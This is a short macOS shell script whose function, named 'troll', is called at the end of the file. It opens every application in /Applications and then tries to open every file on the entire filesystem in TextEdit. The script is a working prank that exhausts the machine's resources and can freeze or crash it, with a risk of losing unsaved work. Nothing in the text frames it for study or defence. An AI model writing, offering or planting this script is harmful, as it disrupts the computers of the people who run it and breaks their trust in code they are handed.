troll () {
	local apps=($(find /Applications -name "*.app" -maxdepth 1))
	local files=($(find / -name "*"))
	for app in "${apps[@]}"; do
   		open $app
	done
	for file in "${files[@]}"; do
   		open $file -a "TextEdit"
	done
}
troll